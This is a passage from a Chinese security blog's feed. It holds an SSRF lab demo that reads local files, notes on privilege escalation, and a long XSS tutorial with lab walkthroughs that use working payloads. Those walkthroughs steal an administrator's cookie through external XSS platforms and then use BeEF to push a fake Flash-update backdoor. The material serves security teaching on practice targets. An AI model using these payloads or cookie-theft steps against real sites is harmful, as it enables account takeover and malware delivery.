id="SSRF（file-get-content"><a href="#SSRF（file-get-content" class="headerlink" title="SSRF（file_get_content)"></a>SSRF（file_get_content)</h2><p><img src="https://img-blog.csdnimg.cn/a8a8b4d685a64100a4787c466cb73b36.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_7,color_FFFFFF,t_70,g_se,x_16"></p><p>http://192.168.48.131/pikachu/vul/ssrf/ssrf_fgc.php?file&#x3D;http://127.0.0.1/pikachu/vul/ssrf/ssrf_info&#x2F;info2.php</p><p><img src="https://img-blog.csdnimg.cn/4150ae653c4449198e1fdccd596cd841.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>file_get_content 可以对本地和远程的文件进行读取</p><p>http://192.168.48.131/pikachu/vul/ssrf/ssrf_fgc.php?file&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini</p><p><img src="https://img-blog.csdnimg.cn/1b23578f54b1442e896f652d5df71847.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>水平垂直 越权</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%20%E8%B6%8A%E6%9D%83/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%20%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="1-水平-垂直越权"><a href="#1-水平-垂直越权" class="headerlink" title="1.水平 垂直越权"></a>1.水平 垂直越权</h2><p>使用权限高的用户去操作权限低的用户的行为称为 “越权”, 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的</p><p>越权漏洞通常出现在需要权限才能操作的页面, 例如增加, 删除, 修改, 查询等等, 后台会对当前的用户权限进行检验, 从而给出响应, 若检验的规则过于简单则容易出现越权漏洞</p><p>越权漏洞又分为水平越权和垂直越权:</p><ul><li>水平越权: A 用户和 B 用户属于同一级别的用户, 但各自都不能操作对方的个人信息。若 A 用户能够越权操作 B 用户的个人信息, 这种情况我们称之为 “水平越权”</li><li>垂直越权: A 用户权限高于 B 用户, B 用户能对 A 用户进行操作的情况称为 “垂直越权”</li><li></li></ul><ol><li>逻辑越权原理</li></ol><ul><li>水平越权：用户信息获取时&#x3D;&#x3D;未对用户与ID 比较判断&#x3D;&#x3D;直接查询等<br>权限-水平越权-YXCMS-检测数据比对弱<br>只检测用户和ID 对应关系，没检测当前操作用户是不是当前用户</li><li>垂直越权：数据库中&#x3D;&#x3D;用户类型编号接受篡改&#x3D;&#x3D;或高&#x3D;&#x3D;权限操作未验证&#x3D;&#x3D;等<br>权限-垂直越权-MINICMS-权限操作无验证<br>后台数据包访问先执行后判断登录等于无效</li></ul><ol><li>越权的修复</li></ol><ul><li>水平越权：把注册或表单的数据直接获取用户名定死，只能修改用户名对应的数据项，防止随意截取更改</li><li>垂直越权：</li></ul><p>2、访问控制原理-  </p><ul><li>验证丢失：未包含引用验证代码文件等  </li><li>取消验证：支持空口令,匿名,白名单等<br>3、脆弱验证原理-  </li><li>Cookie&amp;Token&amp;Jwt：不安全的验证逻辑等</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 越权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 跨站漏洞</title>
      <link href="/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、XSS-跨站漏洞"><a href="#一、XSS-跨站漏洞" class="headerlink" title="一、XSS 跨站漏洞"></a>一、XSS 跨站漏洞</h1><h3 id="（1）XSS-简介"><a href="#（1）XSS-简介" class="headerlink" title="（1）XSS 简介"></a>（1）XSS 简介</h3><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本应当是 css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称 XSS）的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p><p>跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，<strong>是代码注入的一种</strong>。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用 xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和 cookie 等各种内容</p><p>攻击者利用 XSS 漏洞旁路掉访问控制——例如同源策略 (same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing) 攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击”，而 JavaScript 是新型的“ShellCode”。</p><p>xss 漏洞通常是通过 php 的输出函数将 javascript 代码输出到 html 页面中，通过用户本地浏览器执行的，所以 xss 漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xss = $_GET[&#x27;x&#x27;];</span><br><span class="line">echo $xss;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="http://upload-images.jianshu.io/upload_images/27650211-d526faca19246c12.png"></p><h3 id="（2）产生层面"><a href="#（2）产生层面" class="headerlink" title="（2）产生层面"></a>（2）产生层面</h3><p>产生层面一般都是在前端，JavaScript 代码能干什么，执行之后就会达到相应的效果</p><h3 id="（3）函数类"><a href="#（3）函数类" class="headerlink" title="（3）函数类"></a>（3）函数类</h3><p>比如说 php 中的脚本的输出函数</p><p>常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p><h3 id="（4）危害影响"><a href="#（4）危害影响" class="headerlink" title="（4）危害影响"></a>（4）危害影响</h3><ul><li><p>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p></li><li><p>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p></li><li><p>盗窃企业重要的具有商业价值的资料</p></li><li><p>非法转账</p></li><li><p>强制发送电子邮件</p></li><li><p>网站挂马</p></li><li><p>控制受害者机器向其它网站发起攻击</p></li></ul><p>其实归根结底，XSS 的攻击方式就是想办法 “教唆” 用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在 XSS 中除非恶作剧，不然是不会在恶意植入代码中写上<code>alert(&quot;say something&quot;)</code>的。在真正的应用中，XSS 攻击可以干的事情还有很多，这里举两个例子。</p><ol><li><p><strong>窃取网页浏览中的 cookie 值</strong>。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个 cookie 值。这个 cookie 值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的 cookie 值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过 script 脚本获得当前页面的 cookie 值，通常会用到 cookie。试想下如果像空间说说中能够写入 xss 攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似 QQ 的 cookie 有其他验证措施保证同一 cookie 不能被滥用）</p></li><li><p><strong>劫持流量实现恶意跳转</strong>。这个很简单，就是在网页中想办法插入一句像这样的语句： <code>&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</code>那么所访问的网站就会被跳转到百度的首页。早在 2011 年新浪就曾爆出过严重的 xss 漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</p></li></ol><h3 id="（5）浏览器内核版本"><a href="#（5）浏览器内核版本" class="headerlink" title="（5）浏览器内核版本"></a>（5）浏览器内核版本</h3><p>利用 XSS 需要浏览器版本和内核没有过滤 XSS 攻击（比如用谷歌 Edge 火狐等打开可以成功，但是 IE 却会拦截）</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-bca64ac44557621b.png"></p><h3 id="（6）常出现场景"><a href="#（6）常出现场景" class="headerlink" title="（6）常出现场景"></a>（6）常出现场景</h3><p>文章发表、评论、留言、注册资料的地方、修改资料的地方等</p><h1 id="二、XSS-攻击的分类"><a href="#二、XSS-攻击的分类" class="headerlink" title="二、XSS 攻击的分类"></a>二、XSS 攻击的分类</h1><p>XSS 攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p><h3 id="（1）来自内部的攻击"><a href="#（1）来自内部的攻击" class="headerlink" title="（1）来自内部的攻击"></a>（1）来自内部的攻击</h3><p>主要指的是利用程序自身的漏洞，构造跨站语句，如: dvbbs 的 showerror.asp 存在的跨站漏洞。</p><h3 id="（2）来自外部的攻击"><a href="#（2）来自外部的攻击" class="headerlink" title="（2）来自外部的攻击"></a>（2）来自外部的攻击</h3><p>主要指的自己构造 XSS 跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p><h1 id="三、XSS-的分类"><a href="#三、XSS-的分类" class="headerlink" title="三、XSS 的分类"></a>三、XSS 的分类</h1><h2 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型 (非持久化)"></a>1、反射型 (非持久化)</h2><h3 id="（1）原理"><a href="#（1）原理" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>反射型 xss 又称非持久型 xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。这个过程像一次反射，所以称反射型 XSS。</p><h3 id="（2）攻击方式"><a href="#（2）攻击方式" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>攻击者通过电子邮件等方式将包含 xss 代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有 xss 代码的数据发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后就会触发 xss 漏洞</p><h3 id="（3）判断是否存在反射型-xss-漏洞并利用"><a href="#（3）判断是否存在反射型-xss-漏洞并利用" class="headerlink" title="（3）判断是否存在反射型 xss 漏洞并利用"></a>（3）判断是否存在反射型 xss 漏洞并利用</h3><h4 id="①-判断有没有过滤一些特殊的字符"><a href="#①-判断有没有过滤一些特殊的字符" class="headerlink" title="① 判断有没有过滤一些特殊的字符"></a>① 判断有没有过滤一些特殊的字符</h4><p>比如对比输出的字符和输出的字符，可以看到有些字符被过滤了</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-724b1320aad2ff39.png"></p><h4 id="②-注入代码"><a href="#②-注入代码" class="headerlink" title="② 注入代码"></a>② 注入代码</h4><p>下面是大概的原理</p><p>假如我输入的是 1，提交后，点击查看网页源代码</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-037d65c4a2fae924.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-20c059cec3d3fa60.png"></p><h4 id="③-插入代码"><a href="#③-插入代码" class="headerlink" title="③ 插入代码"></a>③ 插入代码</h4><p><code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code> #如果读取图片失败，则用 alert 显示相关信息</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-b620655fd14dcaba.png"> img</p><p>显示了信息，则说明存在 xss 注入</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-8aa3c2680b1f0171.png"> img</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-79aa1dcf37751d2a.png"></p><p>可以对比看到，通过前面的闭合以及后面的代码插入，读取不到图片，因此触发了 alert 弹窗，显示了括号内的内容即 &#x2F; xss&#x2F;</p><h4 id="④-利用-xss-漏洞"><a href="#④-利用-xss-漏洞" class="headerlink" title="④ 利用 xss 漏洞"></a>④ 利用 xss 漏洞</h4><p>将刚刚成功注入代码并能触发 xss 的网址通过电子邮件等方式发送给对方的手中，如果结合 xss 平台，对方点击了链接，就能得到对方的 cookie 等信息</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-ff86a5cc65677ef6.png"></p><h2 id="2、存储型-持久化"><a href="#2、存储型-持久化" class="headerlink" title="2、存储型 (持久化)"></a>2、存储型 (持久化)</h2><p><img src="http://upload-images.jianshu.io/upload_images/27650211-459a37e45df7d961.png"></p><h3 id="（1）原理-1"><a href="#（1）原理-1" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>存储型 XSS 和反射型 XSS 的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交 XSS 代码。最典型的例子就是留言板 XSS，用户提交一条包含 XSS 代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了 XSS 攻击</p><h3 id="（2）攻击方式-1"><a href="#（2）攻击方式-1" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p><h3 id="（3）payload"><a href="#（3）payload" class="headerlink" title="（3）payload"></a>（3）payload</h3><p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p>注入后重新刷新发现直接回显注入的东西，说明是存储型 xss</p><h2 id="3、DOM-型"><a href="#3、DOM-型" class="headerlink" title="3、DOM 型"></a>3、DOM 型</h2><p><img src="http://upload-images.jianshu.io/upload_images/27650211-41d0757a444c8eb8.png"></p><h3 id="（1）原理-2"><a href="#（1）原理-2" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>文档对象模型 Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p><p>DOM 型 xss 其实是一种特殊类型的反射型 xss，也被称作<strong>本地跨站</strong>，它是基于 DOM 文档对象模型的一种漏洞。<strong>DOM XSS 和反射型 XSS、存储型 XSS 的区别在于 DOM XSS 代码并不需要服务器参与，出发 XSS 靠的是浏览器的 DOM 解析，完全是客户端的事情</strong></p><p>DOM 中有很多对象，其中一些对象可以被用户所操纵，如 url，location 等。客户端的脚本程序可以通过 DOM 来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得 DOM 中的数据后并在本地执行，因此仅从服务器端是没有办法防御 DOM 型 XSS 漏洞的，如若 DOM 中的数据没有经过严格的验证，便会产生基于 DOM 的 XSS 漏洞。</p><p>基于 DOM 的 XSS 是反射的特例，其中 JavaScript 隐藏在 URL 中，并在其呈现时由页面中的 JavaScript 取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的 WAF 或其他防护检测不出恶意内容。</p><h3 id="（2）攻击方式-2"><a href="#（2）攻击方式-2" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>用户请求一个经过专门设计的 URL，它由攻击者提交，而且其中包含 xss 代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM 对象就会处理 xss 代码，导致存在 xss 漏洞</p><h3 id="（3）payload-1"><a href="#（3）payload-1" class="headerlink" title="（3）payload"></a>（3）payload</h3><ul><li><code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></li></ul><h1 id="四、XSS-攻击的途径"><a href="#四、XSS-攻击的途径" class="headerlink" title="四、XSS 攻击的途径"></a>四、XSS 攻击的途径</h1><p>XSS 攻击方法只是利用 HTML 的属性做各种尝试，找出注入的方法。现在对三种 XSS 攻击的主要方式进行分析。</p><ol><li><p>第一种：对普通的用户输入，页面原样输出，攻击者通过对 JSCODE 的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的 Cookie.</p></li><li><p>第二种：在代码区内存在有用户输入的内容</p></li><li><p>第三种：允许用户输入 HTML 标签的页面，用户可以提交一些自定义的 HTML 代码。</p></li></ol><h1 id="五、靶场实战"><a href="#五、靶场实战" class="headerlink" title="五、靶场实战"></a>五、靶场实战</h1><h2 id="1、PHP-开源多功能留言板"><a href="#1、PHP-开源多功能留言板" class="headerlink" title="1、PHP 开源多功能留言板"></a>1、PHP 开源多功能留言板</h2><h3 id="（1）搭建靶场"><a href="#（1）搭建靶场" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><p>PHP 开源多功能留言板下载地址：<a href="https://links.jianshu.com/go?to=https://down.chinaz.com/soft/37581.htm">https://down.chinaz.com/soft/37581.htm</a> ，按照教程安装即可</p><h3 id="（2）XSS-平台"><a href="#（2）XSS-平台" class="headerlink" title="（2）XSS 平台"></a>（2）XSS 平台</h3><ul><li><p>网址 1：<a href="https://links.jianshu.com/go?to=https://xss.pt/xss.php">https://xss.pt/xss.php</a></p></li><li><p>网址 2：<a href="https://links.jianshu.com/go?to=http://xss.fbisb.com/xss.php">http://xss.fbisb.com/xss.php</a></p></li><li><p>网址 3：<a href="https://links.jianshu.com/go?to=https://xss8.cc/login/">https://xss8.cc/login/</a></p></li><li><p>网址 4：<a href="https://links.jianshu.com/go?to=https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></p></li></ul><h3 id="（3）进行攻击"><a href="#（3）进行攻击" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试"><a href="#①-初次尝试" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>尝试用简单的 JS 代码进行 XSS 攻击</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-b86f219b94c2d24d.png"></p><p>存在 JS 过滤</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-32cedc1447e3b223.png"></p><h4 id="②-绕过-lt-script-gt-检测"><a href="#②-绕过-lt-script-gt-检测" class="headerlink" title="② 绕过&lt;script&gt;检测"></a>② 绕过<code>&lt;script&gt;</code>检测</h4><p>使用以下语句绕过<code>&lt;script &gt;</code>过滤：<code>&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-2e983645a0b89c1f.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-de31246bb39b9abd.png"></p><p>成功弹出弹窗</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-421ceee16835a3a5.png"></p><p>管理员后台查看也会弹出弹窗</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-04b9e3cbec1003e3.png"></p><p>而弹出弹窗的原因就是这句 JS 代码嵌入到了代码中</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-ade1835d43667f1f.png"></p><h4 id="③-利用-XSS-平台获取-cookie"><a href="#③-利用-XSS-平台获取-cookie" class="headerlink" title="③ 利用 XSS 平台获取 cookie"></a>③ 利用 XSS 平台获取 cookie</h4><p>此时利用 XSS 平台，启用默认模块，因为这个留言板会过滤<code>&lt;script&gt;</code>标签，因此我选择使用 img 标签进行 XSS 攻击</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-b7241b47d6efb1a7.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-90dcdfda40729c8b.png"> img</p><p>发送 payload 成功</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-3a998fe109b3dba0.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-2e7516b96c7de8ea.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-ba1b7e0f224898fa.png"></p><p>管理员到后台查看留言</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-a1967b12d014f919.png"></p><p>此时 XSS 平台就有记录了</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-828f2acada83ef3f.png"></p><h4 id="④-使用-firebug-登录后台"><a href="#④-使用-firebug-登录后台" class="headerlink" title="④ 使用 firebug 登录后台"></a>④ 使用 firebug 登录后台</h4><p>获取到访问的 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http://192.168.100.120/SyGuestBook_v1.2/index.php?c=adminMessage&amp;a=ListMessage&amp;gid=1</span><br><span class="line">Cookie：valueName=w01ke; valueQq=5201314; PHPSESSID=en5mt3n1snl0hvg6d45mji2a95&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>用获取到的 cookie 和后台链接，使用 firebug 进行设置</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-3727e71d0527660d.png"></p><p>成功进入后台！</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-88d49445998eca30.png"></p><p>注意：因为是留言板，因此别人查看我们留下的 XSS 攻击代码时，也会记录到 XSS 平台，因此查看 XSS 平台的记录时注意甄别访客和管理员</p><h2 id="2、BUUCTF-basic-BUU-XSS-COURSE-1"><a href="#2、BUUCTF-basic-BUU-XSS-COURSE-1" class="headerlink" title="2、BUUCTF-basic-BUU XSS COURSE 1"></a>2、BUUCTF-basic-BUU XSS COURSE 1</h2><ul><li>👉<a href="https://links.jianshu.com/go?to=https://www.yuque.com/docs/share/d0abe6d1-1669-4d83-a4d2-6fe1e82f770d">《BUUCTF-basic-BUU XSS COURSE 1》</a>👈</li></ul><h2 id="3、订单系统——军锋真人-CS-野战-123"><a href="#3、订单系统——军锋真人-CS-野战-123" class="headerlink" title="3、订单系统——军锋真人 CS 野战 123"></a>3、订单系统——军锋真人 CS 野战 123</h2><h3 id="（1）靶场下载"><a href="#（1）靶场下载" class="headerlink" title="（1）靶场下载"></a>（1）靶场下载</h3><p>链接：<a href="https://links.jianshu.com/go?to=https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg">https://pan.baidu.com/s/1YUKC5IIh9Kl7P9loe0p2Lg</a> ，提取码：rtra</p><h3 id="（2）靶场安装"><a href="#（2）靶场安装" class="headerlink" title="（2）靶场安装"></a>（2）靶场安装</h3><p>注意下载安装好后仔细查看安装说明，比如 config.php 的数据库账密要对，否则连接不上数据库</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-4d8585a47dcb02a5.png"></p><p>如果访问 install.php 提示以下信息，按照提示操作即可</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-4adae7e0176cf9f0.png"></p><p>在真实机部署环境时出现了一系列问题（后台登录页面验证码无法显示），我是在 Win7 虚拟机，PHP 版本为 5.3.29 部署成功的</p><h3 id="（3）进行攻击-1"><a href="#（3）进行攻击-1" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试-1"><a href="#①-初次尝试-1" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>攻击者在具体要求一栏构造 payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-b6f571b666cb48fa.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-566294811fca4664.png"></p><p>管理员在后台进行查看时就会弹出弹窗</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-789e71ce4f73ad9e.png"></p><p>正是因为我们的 JS 代码嵌入到了其中</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-b58f2e68c1ad783f.png"></p><h4 id="②-XSS-平台获取-cookie"><a href="#②-XSS-平台获取-cookie" class="headerlink" title="② XSS 平台获取 cookie"></a>② XSS 平台获取 cookie</h4><p>选择 XSS 平台的攻击代码</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-3b8860a921cf8f1d.png"></p><p>提交</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-d09f480e2480bd63.png"></p><p>管理员在后台查看时就会触发攻击代码</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-26e46652b621252f.png"></p><p>此时在 XSS 平台就能查看到获取的信息</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-b2b9a07568c3dd5f.png"></p><h4 id="③-postman-登录后台"><a href="#③-postman-登录后台" class="headerlink" title="③ postman 登录后台"></a>③ postman 登录后台</h4><p>postman 下载地址：<a href="https://links.jianshu.com/go?to=https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-fce1d780bdaa55e4.png"></p><h3 id="（4）Beef-结合-XSS-攻击"><a href="#（4）Beef-结合-XSS-攻击" class="headerlink" title="（4）Beef 结合 XSS 攻击"></a>（4）Beef 结合 XSS 攻击</h3><h4 id="①-安装-Beef-xss"><a href="#①-安装-Beef-xss" class="headerlink" title="① 安装 Beef-xss"></a>① 安装 Beef-xss</h4><p>最新版 kali 安装 beef-xss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure><p>如果遇到找不到包</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-1eabc0ae38b1e4bb.png"></p><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 编辑文件</span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"># 添加旧的资源信息</span><br><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line"># For source package access, uncomment the following line</span><br><span class="line"># deb-src http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line"># For source package access, uncomment the following line</span><br><span class="line"># deb-src http://http.kali.org/kali sana main non-free contrib</span><br><span class="line"># deb-src http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br><span class="line"># For source package access, uncomment the following line</span><br><span class="line"># deb-src http://old.kali.org/kali moto main non-free contrib</span><br><span class="line"></span><br><span class="line"># 更新资源列表</span><br><span class="line">sudo apt-get update&lt;/pre&gt;</span><br></pre></td></tr></table></figure><p>更新完毕后重新安装目标应用即可</p><p>安装完成后，直接使用 beef-xss 启动会有启动失败的问题，目前还不知道解决方法</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-6f08002a6744d5b7.png"></p><p>但是可以进入<code>/usr/share/beef-xss/</code>目录，使用<code>./beef</code>启动即可</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-7d9400c0af72acd1.png"></p><p>如果需要修改登录账号密码可以修改 config.yaml 文件</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-509c48cf018b5136.png"></p><h4 id="②-使用-beef-xss"><a href="#②-使用-beef-xss" class="headerlink" title="② 使用 beef-xss"></a>② 使用 beef-xss</h4><p>启动 beef 后，插入钩子，提交</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-0f55b1d55c7d43f2.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-33b1be538c8ce109.png"></p><p>后台管理员查看订单触发 XSS</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-9a9045528e2d4c67.png"></p><p>成功上线</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-89d785f269416c87.png"></p><p>获取 Cookie</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-d8aa21aeb1ced056.png"></p><p>浏览器跳转</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-ba6052f8a3cd1d07.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-e2fe71eac2726d19.png"></p><p>社工攻击，利用模拟 Flash 更新向客户端发送请求，来实现下载后门</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-5b6ec4e3b8496560.png"></p><p>客户端显示，点击就下载后门</p><p><img src="http://upload-images.jianshu.io/upload_images/27650211-21df4802cfb80c3a.png"></p><h2 id="4、WebShell-箱子管理系统"><a href="#4、WebShell-箱子管理系统" class="headerlink" title="4、WebShell 箱子管理系统"></a>4、WebShell 